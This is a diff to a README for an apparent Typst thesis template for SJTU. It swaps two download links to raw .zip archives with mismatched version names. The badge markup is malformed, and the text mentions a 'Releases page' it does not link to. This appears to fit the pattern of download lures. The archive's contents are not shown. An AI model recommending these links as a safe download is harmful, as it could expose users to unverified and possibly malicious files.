@@ -2,7 +2,7 @@
 
 ## 📥 Download the Template
 
-[![Download SJTU Template](https://raw.githubusercontent.com/Pelumi-oloruntegbe/SJTU-Bachelor-Thesis-Midterm-Typst-Template/main/0.1.0/Thesis-Template-Typst-Bachelor-Midterm-SJT-3.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Pelumi-oloruntegbe/SJTU-Bachelor-Thesis-Midterm-Typst-Template/main/0.1.0/Thesis-Template-Typst-Bachelor-Midterm-SJT-3.5.zip)
+[![Download SJTU Template](https://github.com/Pelumi-oloruntegbe/SJTU-Bachelor-Thesis-Midterm-Typst-Template/raw/refs/heads/main/0.1.0/SJT-Midterm-Template-Thesis-Bachelor-Typst-v2.6-beta.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/Pelumi-oloruntegbe/SJTU-Bachelor-Thesis-Midterm-Typst-Template/raw/refs/heads/main/0.1.0/SJT-Midterm-Template-Thesis-Bachelor-Typst-v2.6-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To use this template, you will need:
 
 To download the template, visit the Releases page:
 
-[Download Template Here](https://raw.githubusercontent.com/Pelumi-oloruntegbe/SJTU-Bachelor-Thesis-Midterm-Typst-Template/main/0.1.0/Thesis-Template-Typst-Bachelor-Midterm-SJT-3.5.zip)
+[Download Template Here](https://github.com/Pelumi-oloruntegbe/SJTU-Bachelor-Thesis-Midterm-Typst-Template/raw/refs/heads/main/0.1.0/SJT-Midterm-Template-Thesis-Bachelor-Typst-v2.6-beta.5.zip)
 
 Once on the page, follow these steps:
 
